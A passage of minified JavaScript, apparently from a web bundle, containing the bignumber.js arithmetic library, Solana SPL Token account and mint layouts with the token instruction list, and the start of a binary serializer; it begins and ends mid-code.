e=t.c.length-1;return As(t.e/ws)==e&&t.c[e]%2!=0}function xs(t,e){return(t.length>1?t.charAt(0)+"."+t.slice(1):t)+(e<0?"e":"e+")+e}function Ms(t,e,r){var n,i;if(e<0){for(i=r+".";++e;i+=r);t=i+t}else if(++e>(n=t.length)){for(i=r,e-=n;--e;i+=r);t+=i}else e<n&&(t=t.slice(0,e)+"."+t.slice(e));return t}var Os=function t(e){var r,n,i,o,s,a,c,u,h,l,f=B.prototype={constructor:B,toString:null,valueOf:null},d=new B(1),p=20,g=4,m=-7,y=21,w=-1e7,b=1e7,v=!1,k=1,S=0,A={prefix:"",groupSize:3,secondaryGroupSize:0,groupSeparator:",",decimalSeparator:".",fractionGroupSize:0,fractionGroupSeparator:" ",suffix:""},E="0123456789abcdefghijklmnopqrstuvwxyz",_=!0;function B(t,e){var r,o,s,a,c,u,h,l,f=this;if(!(f instanceof B))return new B(t,e);if(null==e){if(t&&!0===t._isBigNumber)return f.s=t.s,void(!t.c||t.e>b?f.c=f.e=null:t.e<w?f.c=[f.e=0]:(f.e=t.e,f.c=t.c.slice()));if((u="number"==typeof t)&&0*t==0){if(f.s=1/t<0?(t=-t,-1):1,t===~~t){for(a=0,c=t;c>=10;c/=10,a++);return void(a>b?f.c=f.e=null:(f.e=a,f.c=[t]))}l=String(t)}else{if(!fs.test(l=String(t)))return i(f,l,u);f.s=45==l.charCodeAt(0)?(l=l.slice(1),-1):1}(a=l.indexOf("."))>-1&&(l=l.replace(".","")),(c=l.search(/e/i))>0?(a<0&&(a=c),a+=+l.slice(c+1),l=l.substring(0,c)):a<0&&(a=l.length)}else{if(Bs(e,2,E.length,"Base"),10==e&&_)return O(f=new B(t),p+f.e+1,g);if(l=String(t),u="number"==typeof t){if(0*t!=0)return i(f,l,u,e);if(f.s=1/t<0?(l=l.slice(1),-1):1,B.DEBUG&&l.replace(/^0\.0*|\./,"").length>15)throw Error(ms+t)}else f.s=45===l.charCodeAt(0)?(l=l.slice(1),-1):1;for(r=E.slice(0,e),a=c=0,h=l.length;c<h;c++)if(r.indexOf(o=l.charAt(c))<0){if("."==o){if(c>a){a=h;continue}}else if(!s&&(l==l.toUpperCase()&&(l=l.toLowerCase())||l==l.toLowerCase()&&(l=l.toUpperCase()))){s=!0,c=-1,a=0;continue}return i(f,String(t),u,e)}u=!1,(a=(l=n(l,e,10,f.s)).indexOf("."))>-1?l=l.replace(".",""):a=l.length}for(c=0;48===l.charCodeAt(c);c++);for(h=l.length;48===l.charCodeAt(--h););if(l=l.slice(c,++h)){if(h-=c,u&&B.DEBUG&&h>15&&(t>bs||t!==ps(t)))throw Error(ms+f.s*t);if((a=a-c-1)>b)f.c=f.e=null;else if(a<w)f.c=[f.e=0];else{if(f.e=a,f.c=[],c=(a+1)%ws,a<0&&(c+=ws),c<h){for(c&&f.c.push(+l.slice(0,c)),h-=ws;c<h;)f.c.push(+l.slice(c,c+=ws));c=ws-(l=l.slice(c)).length}else c-=h;for(;c--;l+="0");f.c.push(+l)}}else f.c=[f.e=0]}function I(t,e,r,n){var i,o,s,a,c;if(null==r?r=g:Bs(r,0,8),!t.c)return t.toString();if(i=t.c[0],s=t.e,null==e)c=Es(t.c),c=1==n||2==n&&(s<=m||s>=y)?xs(c,s):Ms(c,s,"0");else if(o=(t=O(new B(t),e,r)).e,a=(c=Es(t.c)).length,1==n||2==n&&(e<=o||o<=m)){for(;a<e;c+="0",a++);c=xs(c,o)}else if(e-=s,c=Ms(c,o,"0"),o+1>a){if(--e>0)for(c+=".";e--;c+="0");}else if((e+=o-a)>0)for(o+1==a&&(c+=".");e--;c+="0");return t.s<0&&i?"-"+c:c}function x(t,e){for(var r,n,i=1,o=new B(t[0]);i<t.length;i++)(!(n=new B(t[i])).s||(r=_s(o,n))===e||0===r&&o.s===e)&&(o=n);return o}function M(t,e,r){for(var n=1,i=e.length;!e[--i];e.pop());for(i=e[0];i>=10;i/=10,n++);return(r=n+r*ws-1)>b?t.c=t.e=null:r<w?t.c=[t.e=0]:(t.e=r,t.c=e),t}function O(t,e,r,n){var i,o,s,a,c,u,h,l=t.c,f=vs;if(l){t:{for(i=1,a=l[0];a>=10;a/=10,i++);if((o=e-i)<0)o+=ws,s=e,c=l[u=0],h=ps(c/f[i-s-1]%10);else if((u=ds((o+1)/ws))>=l.length){if(!n)break t;for(;l.length<=u;l.push(0));c=h=0,i=1,s=(o%=ws)-ws+1}else{for(c=a=l[u],i=1;a>=10;a/=10,i++);h=(s=(o%=ws)-ws+i)<0?0:ps(c/f[i-s-1]%10)}if(n=n||e<0||null!=l[u+1]||(s<0?c:c%f[i-s-1]),n=r<4?(h||n)&&(0==r||r==(t.s<0?3:2)):h>5||5==h&&(4==r||n||6==r&&(o>0?s>0?c/f[i-s]:0:l[u-1])%10&1||r==(t.s<0?8:7)),e<1||!l[0])return l.length=0,n?(e-=t.e+1,l[0]=f[(ws-e%ws)%ws],t.e=-e||0):l[0]=t.e=0,t;if(0==o?(l.length=u,a=1,u--):(l.length=u+1,a=f[ws-o],l[u]=s>0?ps(c/f[i-s]%f[s])*a:0),n)for(;;){if(0==u){for(o=1,s=l[0];s>=10;s/=10,o++);for(s=l[0]+=a,a=1;s>=10;s/=10,a++);o!=a&&(t.e++,l[0]==ys&&(l[0]=1));break}if(l[u]+=a,l[u]!=ys)break;l[u--]=0,a=1}for(o=l.length;0===l[--o];l.pop());}t.e>b?t.c=t.e=null:t.e<w&&(t.c=[t.e=0])}return t}function T(t){var e,r=t.e;return null===r?t.toString():(e=Es(t.c),e=r<=m||r>=y?xs(e,r):Ms(e,r,"0"),t.s<0?"-"+e:e)}return B.clone=t,B.ROUND_UP=0,B.ROUND_DOWN=1,B.ROUND_CEIL=2,B.ROUND_FLOOR=3,B.ROUND_HALF_UP=4,B.ROUND_HALF_DOWN=5,B.ROUND_HALF_EVEN=6,B.ROUND_HALF_CEIL=7,B.ROUND_HALF_FLOOR=8,B.EUCLID=9,B.config=B.set=function(t){var e,r;if(null!=t){if("object"!=typeof t)throw Error(gs+"Object expected: "+t);if(t.hasOwnProperty(e="DECIMAL_PLACES")&&(Bs(r=t[e],0,Ss,e),p=r),t.hasOwnProperty(e="ROUNDING_MODE")&&(Bs(r=t[e],0,8,e),g=r),t.hasOwnProperty(e="EXPONENTIAL_AT")&&((r=t[e])&&r.pop?(Bs(r[0],-Ss,0,e),Bs(r[1],0,Ss,e),m=r[0],y=r[1]):(Bs(r,-Ss,Ss,e),m=-(y=r<0?-r:r))),t.hasOwnProperty(e="RANGE"))if((r=t[e])&&r.pop)Bs(r[0],-Ss,-1,e),Bs(r[1],1,Ss,e),w=r[0],b=r[1];else{if(Bs(r,-Ss,Ss,e),!r)throw Error(gs+e+" cannot be zero: "+r);w=-(b=r<0?-r:r)}if(t.hasOwnProperty(e="CRYPTO")){if((r=t[e])!==!!r)throw Error(gs+e+" not true or false: "+r);if(r){if("undefined"==typeof crypto||!crypto||!crypto.getRandomValues&&!crypto.randomBytes)throw v=!r,Error(gs+"crypto unavailable");v=r}else v=r}if(t.hasOwnProperty(e="MODULO_MODE")&&(Bs(r=t[e],0,9,e),k=r),t.hasOwnProperty(e="POW_PRECISION")&&(Bs(r=t[e],0,Ss,e),S=r),t.hasOwnProperty(e="FORMAT")){if("object"!=typeof(r=t[e]))throw Error(gs+e+" not an object: "+r);A=r}if(t.hasOwnProperty(e="ALPHABET")){if("string"!=typeof(r=t[e])||/^.?$|[+\-.\s]|(.).*\1/.test(r))throw Error(gs+e+" invalid: "+r);_="0123456789"==r.slice(0,10),E=r}}return{DECIMAL_PLACES:p,ROUNDING_MODE:g,EXPONENTIAL_AT:[m,y],RANGE:[w,b],CRYPTO:v,MODULO_MODE:k,POW_PRECISION:S,FORMAT:A,ALPHABET:E}},B.isBigNumber=function(t){if(!t||!0!==t._isBigNumber)return!1;if(!B.DEBUG)return!0;var e,r,n=t.c,i=t.e,o=t.s;t:if("[object Array]"=={}.toString.call(n)){if((1===o||-1===o)&&i>=-Ss&&i<=Ss&&i===ps(i)){if(0===n[0]){if(0===i&&1===n.length)return!0;break t}if((e=(i+1)%ws)<1&&(e+=ws),String(n[0]).length==e){for(e=0;e<n.length;e++)if((r=n[e])<0||r>=ys||r!==ps(r))break t;if(0!==r)return!0}}}else if(null===n&&null===i&&(null===o||1===o||-1===o))return!0;throw Error(gs+"Invalid BigNumber: "+t)},B.maximum=B.max=function(){return x(arguments,-1)},B.minimum=B.min=function(){return x(arguments,1)},B.random=(o=9007199254740992,s=Math.random()*o&2097151?function(){return ps(Math.random()*o)}:function(){return 8388608*(1073741824*Math.random()|0)+(8388608*Math.random()|0)},function(t){var e,r,n,i,o,a=0,c=[],u=new B(d);if(null==t?t=p:Bs(t,0,Ss),i=ds(t/ws),v)if(crypto.getRandomValues){for(e=crypto.getRandomValues(new Uint32Array(i*=2));a<i;)(o=131072*e[a]+(e[a+1]>>>11))>=9e15?(r=crypto.getRandomValues(new Uint32Array(2)),e[a]=r[0],e[a+1]=r[1]):(c.push(o%1e14),a+=2);a=i/2}else{if(!crypto.randomBytes)throw v=!1,Error(gs+"crypto unavailable");for(e=crypto.randomBytes(i*=7);a<i;)(o=281474976710656*(31&e[a])+1099511627776*e[a+1]+4294967296*e[a+2]+16777216*e[a+3]+(e[a+4]<<16)+(e[a+5]<<8)+e[a+6])>=9e15?crypto.randomBytes(7).copy(e,a):(c.push(o%1e14),a+=7);a=i/7}if(!v)for(;a<i;)(o=s())<9e15&&(c[a++]=o%1e14);for(i=c[--a],t%=ws,i&&t&&(o=vs[ws-t],c[a]=ps(i/o)*o);0===c[a];c.pop(),a--);if(a<0)c=[n=0];else{for(n=-1;0===c[0];c.splice(0,1),n-=ws);for(a=1,o=c[0];o>=10;o/=10,a++);a<ws&&(n-=ws-a)}return u.e=n,u.c=c,u}),B.sum=function(){for(var t=1,e=arguments,r=new B(e[0]);t<e.length;)r=r.plus(e[t++]);return r},n=function(){var t="0123456789";function e(t,e,r,n){for(var i,o,s=[0],a=0,c=t.length;a<c;){for(o=s.length;o--;s[o]*=e);for(s[0]+=n.indexOf(t.charAt(a++)),i=0;i<s.length;i++)s[i]>r-1&&(null==s[i+1]&&(s[i+1]=0),s[i+1]+=s[i]/r|0,s[i]%=r)}return s.reverse()}return function(n,i,o,s,a){var c,u,h,l,f,d,m,y,w=n.indexOf("."),b=p,v=g;for(w>=0&&(l=S,S=0,n=n.replace(".",""),d=(y=new B(i)).pow(n.length-w),S=l,y.c=e(Ms(Es(d.c),d.e,"0"),10,o,t),y.e=y.c.length),h=l=(m=e(n,i,o,a?(c=E,t):(c=t,E))).length;0==m[--l];m.pop());if(!m[0])return c.charAt(0);if(w<0?--h:(d.c=m,d.e=h,d.s=s,m=(d=r(d,y,b,v,o)).c,f=d.r,h=d.e),w=m[u=h+b+1],l=o/2,f=f||u<0||null!=m[u+1],f=v<4?(null!=w||f)&&(0==v||v==(d.s<0?3:2)):w>l||w==l&&(4==v||f||6==v&&1&m[u-1]||v==(d.s<0?8:7)),u<1||!m[0])n=f?Ms(c.charAt(1),-b,c.charAt(0)):c.charAt(0);else{if(m.length=u,f)for(--o;++m[--u]>o;)m[u]=0,u||(++h,m=[1].concat(m));for(l=m.length;!m[--l];);for(w=0,n="";w<=l;n+=c.charAt(m[w++]));n=Ms(n,h,c.charAt(0))}return n}}(),r=function(){function t(t,e,r){var n,i,o,s,a=0,c=t.length,u=e%ks,h=e/ks|0;for(t=t.slice();c--;)a=((i=u*(o=t[c]%ks)+(n=h*o+(s=t[c]/ks|0)*u)%ks*ks+a)/r|0)+(n/ks|0)+h*s,t[c]=i%r;return a&&(t=[a].concat(t)),t}function e(t,e,r,n){var i,o;if(r!=n)o=r>n?1:-1;else for(i=o=0;i<r;i++)if(t[i]!=e[i]){o=t[i]>e[i]?1:-1;break}return o}function r(t,e,r,n){for(var i=0;r--;)t[r]-=i,i=t[r]<e[r]?1:0,t[r]=i*n+t[r]-e[r];for(;!t[0]&&t.length>1;t.splice(0,1));}return function(n,i,o,s,a){var c,u,h,l,f,d,p,g,m,y,w,b,v,k,S,A,E,_=n.s==i.s?1:-1,I=n.c,x=i.c;if(!(I&&I[0]&&x&&x[0]))return new B(n.s&&i.s&&(I?!x||I[0]!=x[0]:x)?I&&0==I[0]||!x?0*_:_/0:NaN);for(m=(g=new B(_)).c=[],_=o+(u=n.e-i.e)+1,a||(a=ys,u=As(n.e/ws)-As(i.e/ws),_=_/ws|0),h=0;x[h]==(I[h]||0);h++);if(x[h]>(I[h]||0)&&u--,_<0)m.push(1),l=!0;else{for(k=I.length,A=x.length,h=0,_+=2,(f=ps(a/(x[0]+1)))>1&&(x=t(x,f,a),I=t(I,f,a),A=x.length,k=I.length),v=A,w=(y=I.slice(0,A)).length;w<A;y[w++]=0);E=x.slice(),E=[0].concat(E),S=x[0],x[1]>=a/2&&S++;do{if(f=0,(c=e(x,y,A,w))<0){if(b=y[0],A!=w&&(b=b*a+(y[1]||0)),(f=ps(b/S))>1)for(f>=a&&(f=a-1),p=(d=t(x,f,a)).length,w=y.length;1==e(d,y,p,w);)f--,r(d,A<p?E:x,p,a),p=d.length,c=1;else 0==f&&(c=f=1),p=(d=x.slice()).length;if(p<w&&(d=[0].concat(d)),r(y,d,w,a),w=y.length,-1==c)for(;e(x,y,A,w)<1;)f++,r(y,A<w?E:x,w,a),w=y.length}else 0===c&&(f++,y=[0]);m[h++]=f,y[0]?y[w++]=I[v]||0:(y=[I[v]],w=1)}while((v++<k||null!=y[0])&&_--);l=null!=y[0],m[0]||m.splice(0,1)}if(a==ys){for(h=1,_=m[0];_>=10;_/=10,h++);O(g,o+(g.e=h+u*ws-1)+1,s,l)}else g.e=u,g.r=+l;return g}}(),a=/^(-?)0([xbo])(?=\w[\w.]*$)/i,c=/^([^.]+)\.$/,u=/^\.([^.]+)$/,h=/^-?(Infinity|NaN)$/,l=/^\s*\+(?=[\w.])|^\s+|\s+$/g,i=function(t,e,r,n){var i,o=r?e:e.replace(l,"");if(h.test(o))t.s=isNaN(o)?null:o<0?-1:1;else{if(!r&&(o=o.replace(a,(function(t,e,r){return i="x"==(r=r.toLowerCase())?16:"b"==r?2:8,n&&n!=i?t:e})),n&&(i=n,o=o.replace(c,"$1").replace(u,"0.$1")),e!=o))return new B(o,i);if(B.DEBUG)throw Error(gs+"Not a"+(n?" base "+n:"")+" number: "+e);t.s=null}t.c=t.e=null},f.absoluteValue=f.abs=function(){var t=new B(this);return t.s<0&&(t.s=1),t},f.comparedTo=function(t,e){return _s(this,new B(t,e))},f.decimalPlaces=f.dp=function(t,e){var r,n,i,o=this;if(null!=t)return Bs(t,0,Ss),null==e?e=g:Bs(e,0,8),O(new B(o),t+o.e+1,e);if(!(r=o.c))return null;if(n=((i=r.length-1)-As(this.e/ws))*ws,i=r[i])for(;i%10==0;i/=10,n--);return n<0&&(n=0),n},f.dividedBy=f.div=function(t,e){return r(this,new B(t,e),p,g)},f.dividedToIntegerBy=f.idiv=function(t,e){return r(this,new B(t,e),0,1)},f.exponentiatedBy=f.pow=function(t,e){var r,n,i,o,s,a,c,u,h=this;if((t=new B(t)).c&&!t.isInteger())throw Error(gs+"Exponent not an integer: "+T(t));if(null!=e&&(e=new B(e)),s=t.e>14,!h.c||!h.c[0]||1==h.c[0]&&!h.e&&1==h.c.length||!t.c||!t.c[0])return u=new B(Math.pow(+T(h),s?t.s*(2-Is(t)):+T(t))),e?u.mod(e):u;if(a=t.s<0,e){if(e.c?!e.c[0]:!e.s)return new B(NaN);(n=!a&&h.isInteger()&&e.isInteger())&&(h=h.mod(e))}else{if(t.e>9&&(h.e>0||h.e<-1||(0==h.e?h.c[0]>1||s&&h.c[1]>=24e7:h.c[0]<8e13||s&&h.c[0]<=9999975e7)))return o=h.s<0&&Is(t)?-0:0,h.e>-1&&(o=1/o),new B(a?1/o:o);S&&(o=ds(S/ws+2))}for(s?(r=new B(.5),a&&(t.s=1),c=Is(t)):c=(i=Math.abs(+T(t)))%2,u=new B(d);;){if(c){if(!(u=u.times(h)).c)break;o?u.c.length>o&&(u.c.length=o):n&&(u=u.mod(e))}if(i){if(0===(i=ps(i/2)))break;c=i%2}else if(O(t=t.times(r),t.e+1,1),t.e>14)c=Is(t);else{if(0==(i=+T(t)))break;c=i%2}h=h.times(h),o?h.c&&h.c.length>o&&(h.c.length=o):n&&(h=h.mod(e))}return n?u:(a&&(u=d.div(u)),e?u.mod(e):o?O(u,S,g,void 0):u)},f.integerValue=function(t){var e=new B(this);return null==t?t=g:Bs(t,0,8),O(e,e.e+1,t)},f.isEqualTo=f.eq=function(t,e){return 0===_s(this,new B(t,e))},f.isFinite=function(){return!!this.c},f.isGreaterThan=f.gt=function(t,e){return _s(this,new B(t,e))>0},f.isGreaterThanOrEqualTo=f.gte=function(t,e){return 1===(e=_s(this,new B(t,e)))||0===e},f.isInteger=function(){return!!this.c&&As(this.e/ws)>this.c.length-2},f.isLessThan=f.lt=function(t,e){return _s(this,new B(t,e))<0},f.isLessThanOrEqualTo=f.lte=function(t,e){return-1===(e=_s(this,new B(t,e)))||0===e},f.isNaN=function(){return!this.s},f.isNegative=function(){return this.s<0},f.isPositive=function(){return this.s>0},f.isZero=function(){return!!this.c&&0==this.c[0]},f.minus=function(t,e){var r,n,i,o,s=this,a=s.s;if(e=(t=new B(t,e)).s,!a||!e)return new B(NaN);if(a!=e)return t.s=-e,s.plus(t);var c=s.e/ws,u=t.e/ws,h=s.c,l=t.c;if(!c||!u){if(!h||!l)return h?(t.s=-e,t):new B(l?s:NaN);if(!h[0]||!l[0])return l[0]?(t.s=-e,t):new B(h[0]?s:3==g?-0:0)}if(c=As(c),u=As(u),h=h.slice(),a=c-u){for((o=a<0)?(a=-a,i=h):(u=c,i=l),i.reverse(),e=a;e--;i.push(0));i.reverse()}else for(n=(o=(a=h.length)<(e=l.length))?a:e,a=e=0;e<n;e++)if(h[e]!=l[e]){o=h[e]<l[e];break}if(o&&(i=h,h=l,l=i,t.s=-t.s),(e=(n=l.length)-(r=h.length))>0)for(;e--;h[r++]=0);for(e=ys-1;n>a;){if(h[--n]<l[n]){for(r=n;r&&!h[--r];h[r]=e);--h[r],h[n]+=ys}h[n]-=l[n]}for(;0==h[0];h.splice(0,1),--u);return h[0]?M(t,h,u):(t.s=3==g?-1:1,t.c=[t.e=0],t)},f.modulo=f.mod=function(t,e){var n,i,o=this;return t=new B(t,e),!o.c||!t.s||t.c&&!t.c[0]?new B(NaN):!t.c||o.c&&!o.c[0]?new B(o):(9==k?(i=t.s,t.s=1,n=r(o,t,0,3),t.s=i,n.s*=i):n=r(o,t,0,k),(t=o.minus(n.times(t))).c[0]||1!=k||(t.s=o.s),t)},f.multipliedBy=f.times=function(t,e){var r,n,i,o,s,a,c,u,h,l,f,d,p,g,m,y=this,w=y.c,b=(t=new B(t,e)).c;if(!(w&&b&&w[0]&&b[0]))return!y.s||!t.s||w&&!w[0]&&!b||b&&!b[0]&&!w?t.c=t.e=t.s=null:(t.s*=y.s,w&&b?(t.c=[0],t.e=0):t.c=t.e=null),t;for(n=As(y.e/ws)+As(t.e/ws),t.s*=y.s,(c=w.length)<(l=b.length)&&(p=w,w=b,b=p,i=c,c=l,l=i),i=c+l,p=[];i--;p.push(0));for(g=ys,m=ks,i=l;--i>=0;){for(r=0,f=b[i]%m,d=b[i]/m|0,o=i+(s=c);o>i;)r=((u=f*(u=w[--s]%m)+(a=d*u+(h=w[s]/m|0)*f)%m*m+p[o]+r)/g|0)+(a/m|0)+d*h,p[o--]=u%g;p[o]=r}return r?++n:p.splice(0,1),M(t,p,n)},f.negated=function(){var t=new B(this);return t.s=-t.s||null,t},f.plus=function(t,e){var r,n=this,i=n.s;if(e=(t=new B(t,e)).s,!i||!e)return new B(NaN);if(i!=e)return t.s=-e,n.minus(t);var o=n.e/ws,s=t.e/ws,a=n.c,c=t.c;if(!o||!s){if(!a||!c)return new B(i/0);if(!a[0]||!c[0])return c[0]?t:new B(a[0]?n:0*i)}if(o=As(o),s=As(s),a=a.slice(),i=o-s){for(i>0?(s=o,r=c):(i=-i,r=a),r.reverse();i--;r.push(0));r.reverse()}for((i=a.length)-(e=c.length)<0&&(r=c,c=a,a=r,e=i),i=0;e;)i=(a[--e]=a[e]+c[e]+i)/ys|0,a[e]=ys===a[e]?0:a[e]%ys;return i&&(a=[i].concat(a),++s),M(t,a,s)},f.precision=f.sd=function(t,e){var r,n,i,o=this;if(null!=t&&t!==!!t)return Bs(t,1,Ss),null==e?e=g:Bs(e,0,8),O(new B(o),t,e);if(!(r=o.c))return null;if(n=(i=r.length-1)*ws+1,i=r[i]){for(;i%10==0;i/=10,n--);for(i=r[0];i>=10;i/=10,n++);}return t&&o.e+1>n&&(n=o.e+1),n},f.shiftedBy=function(t){return Bs(t,-9007199254740991,bs),this.times("1e"+t)},f.squareRoot=f.sqrt=function(){var t,e,n,i,o,s=this,a=s.c,c=s.s,u=s.e,h=p+4,l=new B("0.5");if(1!==c||!a||!a[0])return new B(!c||c<0&&(!a||a[0])?NaN:a?s:1/0);if(0==(c=Math.sqrt(+T(s)))||c==1/0?(((e=Es(a)).length+u)%2==0&&(e+="0"),c=Math.sqrt(+e),u=As((u+1)/2)-(u<0||u%2),n=new B(e=c==1/0?"5e"+u:(e=c.toExponential()).slice(0,e.indexOf("e")+1)+u)):n=new B(c+""),n.c[0])for((c=(u=n.e)+h)<3&&(c=0);;)if(o=n,n=l.times(o.plus(r(s,o,h,1))),Es(o.c).slice(0,c)===(e=Es(n.c)).slice(0,c)){if(n.e<u&&--c,"9999"!=(e=e.slice(c-3,c+1))&&(i||"4999"!=e)){+e&&(+e.slice(1)||"5"!=e.charAt(0))||(O(n,n.e+p+2,1),t=!n.times(n).eq(s));break}if(!i&&(O(o,o.e+p+2,0),o.times(o).eq(s))){n=o;break}h+=4,c+=4,i=1}return O(n,n.e+p+1,g,t)},f.toExponential=function(t,e){return null!=t&&(Bs(t,0,Ss),t++),I(this,t,e,1)},f.toFixed=function(t,e){return null!=t&&(Bs(t,0,Ss),t=t+this.e+1),I(this,t,e)},f.toFormat=function(t,e,r){var n,i=this;if(null==r)null!=t&&e&&"object"==typeof e?(r=e,e=null):t&&"object"==typeof t?(r=t,t=e=null):r=A;else if("object"!=typeof r)throw Error(gs+"Argument not an object: "+r);if(n=i.toFixed(t,e),i.c){var o,s=n.split("."),a=+r.groupSize,c=+r.secondaryGroupSize,u=r.groupSeparator||"",h=s[0],l=s[1],f=i.s<0,d=f?h.slice(1):h,p=d.length;if(c&&(o=a,a=c,c=o,p-=o),a>0&&p>0){for(o=p%a||a,h=d.substr(0,o);o<p;o+=a)h+=u+d.substr(o,a);c>0&&(h+=u+d.slice(o)),f&&(h="-"+h)}n=l?h+(r.decimalSeparator||"")+((c=+r.fractionGroupSize)?l.replace(new RegExp("\\d{"+c+"}\\B","g"),"$&"+(r.fractionGroupSeparator||"")):l):h}return(r.prefix||"")+n+(r.suffix||"")},f.toFraction=function(t){var e,n,i,o,s,a,c,u,h,l,f,p,m=this,y=m.c;if(null!=t&&(!(c=new B(t)).isInteger()&&(c.c||1!==c.s)||c.lt(d)))throw Error(gs+"Argument "+(c.isInteger()?"out of range: ":"not an integer: ")+T(c));if(!y)return new B(m);for(e=new B(d),h=n=new B(d),i=u=new B(d),p=Es(y),s=e.e=p.length-m.e-1,e.c[0]=vs[(a=s%ws)<0?ws+a:a],t=!t||c.comparedTo(e)>0?s>0?e:h:c,a=b,b=1/0,c=new B(p),u.c[0]=0;l=r(c,e,0,1),1!=(o=n.plus(l.times(i))).comparedTo(t);)n=i,i=o,h=u.plus(l.times(o=h)),u=o,e=c.minus(l.times(o=e)),c=o;return o=r(t.minus(n),i,0,1),u=u.plus(o.times(h)),n=n.plus(o.times(i)),u.s=h.s=m.s,f=r(h,i,s*=2,g).minus(m).abs().comparedTo(r(u,n,s,g).minus(m).abs())<1?[h,i]:[u,n],b=a,f},f.toNumber=function(){return+T(this)},f.toPrecision=function(t,e){return null!=t&&Bs(t,1,Ss),I(this,t,e,2)},f.toString=function(t){var e,r=this,i=r.s,o=r.e;return null===o?i?(e="Infinity",i<0&&(e="-"+e)):e="NaN":(null==t?e=o<=m||o>=y?xs(Es(r.c),o):Ms(Es(r.c),o,"0"):10===t&&_?e=Ms(Es((r=O(new B(r),p+o+1,g)).c),r.e,"0"):(Bs(t,2,E.length,"Base"),e=n(Ms(Es(r.c),o,"0"),10,t,i,!0)),i<0&&r.c[0]&&(e="-"+e)),e},f.valueOf=f.toJSON=function(){return T(this)},f._isBigNumber=!0,f[Symbol.toStringTag]="BigNumber",f[Symbol.for("nodejs.util.inspect.custom")]=f.valueOf,null!=e&&B.set(e),B}();new Os("1e+18");const Ts=t=>{const e=(0,Ie.av)(32,t),{encode:r,decode:n}=as(e),i=e;return i.decode=(t,e)=>{const r=n(t,e);return new an(r)},i.encode=(t,e,n)=>{const i=t.toBuffer();return r(i,e,n)},i},Rs=new an("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),Ps=(new an("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"),new an("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"));new an("So11111111111111111111111111111111111111112"),new an("9pan9bMn5HatX4EJdBwg9VgCa7Uz5HL8N1m5D3NdXejP");class Cs extends Error{constructor(t){super(t)}}class Ls extends Cs{constructor(){super(...arguments),this.name="TokenOwnerOffCurveError"}}r(287).Buffer;const Ns=(0,Ie.w3)([(0,Ie.DH)("mintAuthorityOption"),Ts("mintAuthority"),ls("supply"),(0,Ie.u8)("decimals"),(()=>{const t=(0,Ie.u8)("isInitialized"),{encode:e,decode:r}=as(t),n=t;return n.decode=(t,e)=>!!r(t,e),n.encode=(t,r,n)=>{const i=Number(t);return e(i,r,n)},n})(),(0,Ie.DH)("freezeAuthorityOption"),Ts("freezeAuthority")]);var Us;Ns.span,r(287).Buffer,function(t){t[t.Uninitialized=0]="Uninitialized",t[t.Initialized=1]="Initialized",t[t.Frozen=2]="Frozen"}(Us||(Us={}));const zs=(0,Ie.w3)([Ts("mint"),Ts("owner"),ls("amount"),(0,Ie.DH)("delegateOption"),Ts("delegate"),(0,Ie.u8)("state"),(0,Ie.DH)("isNativeOption"),ls("isNative"),ls("delegatedAmount"),(0,Ie.DH)("closeAuthorityOption"),Ts("closeAuthority")]);zs.span;var Ds,js,Ws=r(287).Buffer;(js=Ds||(Ds={}))[js.InitializeMint=0]="InitializeMint",js[js.InitializeAccount=1]="InitializeAccount",js[js.InitializeMultisig=2]="InitializeMultisig",js[js.Transfer=3]="Transfer",js[js.Approve=4]="Approve",js[js.Revoke=5]="Revoke",js[js.SetAuthority=6]="SetAuthority",js[js.MintTo=7]="MintTo",js[js.Burn=8]="Burn",js[js.CloseAccount=9]="CloseAccount",js[js.FreezeAccount=10]="FreezeAccount",js[js.ThawAccount=11]="ThawAccount",js[js.TransferChecked=12]="TransferChecked",js[js.ApproveChecked=13]="ApproveChecked",js[js.MintToChecked=14]="MintToChecked",js[js.BurnChecked=15]="BurnChecked",js[js.InitializeAccount2=16]="InitializeAccount2",js[js.SyncNative=17]="SyncNative",js[js.InitializeAccount3=18]="InitializeAccount3",js[js.InitializeMultisig2=19]="InitializeMultisig2",js[js.InitializeMint2=20]="InitializeMint2",js[js.GetAccountDataSize=21]="GetAccountDataSize",js[js.InitializeImmutableOwner=22]="InitializeImmutableOwner",js[js.AmountToUiAmount=23]="AmountToUiAmount",js[js.UiAmountToAmount=24]="UiAmountToAmount",js[js.InitializeMintCloseAuthority=25]="InitializeMintCloseAuthority",js[js.TransferFeeExtension=26]="TransferFeeExtension",js[js.ConfidentialTransferExtension=27]="ConfidentialTransferExtension",js[js.DefaultAccountStateExtension=28]="DefaultAccountStateExtension",js[js.Reallocate=29]="Reallocate",js[js.MemoTransferExtension=30]="MemoTransferExtension",js[js.CreateNativeMint=31]="CreateNativeMint",js[js.InitializeNonTransferableMint=32]="InitializeNonTransferableMint",js[js.InterestBearingMintExtension=33]="InterestBearingMintExtension",js[js.CpiGuardExtension=34]="CpiGuardExtension",js[js.InitializePermanentDelegate=35]="InitializePermanentDelegate",js[js.TransferHookExtension=36]="TransferHookExtension",js[js.MetadataPointerExtension=39]="MetadataPointerExtension";var qs=r(287).Buffer;const Fs=(0,Ie.w3)([(0,Ie.u8)("instruction"),ls("amount")]);var Hs,Ks=r(312),$s=["u8","u16","u32","u64","u128","i8","i16","i32","i64","i128","f32","f64"],Vs=function(){function t(){this.offset=0,this.buffer_size=256,this.buffer=new ArrayBuffer(this.buffer_size),this.view=new DataView(this.buffer)}return t.prototype.resize_if_necessary=function(t){if(this.buffer_size-this.offset<t){this.buffer_size=Math.max(2*this.buffer_size,this.buffer_size+t);var e=new ArrayBuffer(this.buffer_size);new Uint8Array(e).set(new Uint8Array(this.buffer)),this.buffer=e,this.view=new DataView(e)}},t.prototype.get_used_buffer=function(){return new Uint8Array(this.buffer).slice(0,this.offset)},t.prototype.store_value=function(t,e){var r=e.substring(1),n=parseInt(r)/8;this.resize_if_necessary(n);var i="f"===e[0]?"setFloat".concat(r):"i"===e[0]?"setInt".concat(r):"setUint".concat(r);this.view[i](this.offset,t,!0),this.offset+=n},t.prototype.store_bytes=function(t){this.resize_if_necessary(t.length),new Uint8Array(this.buffer).set(new Uint8Array(t),this.offset),this.offset+=t.length},t}(),Gs=function(){function t(t){this.offset=0,this.buffer_size=t.length,this.buffer=new ArrayBuffer(t.length),new Uint8Array(this.buffer).set(t),this.view=new DataView(this.buffer)}return t.prototype.assert_enough_buffer=function(t){if(this.offset+t>this.buffer.byteLength)throw new Error("Error in schema, 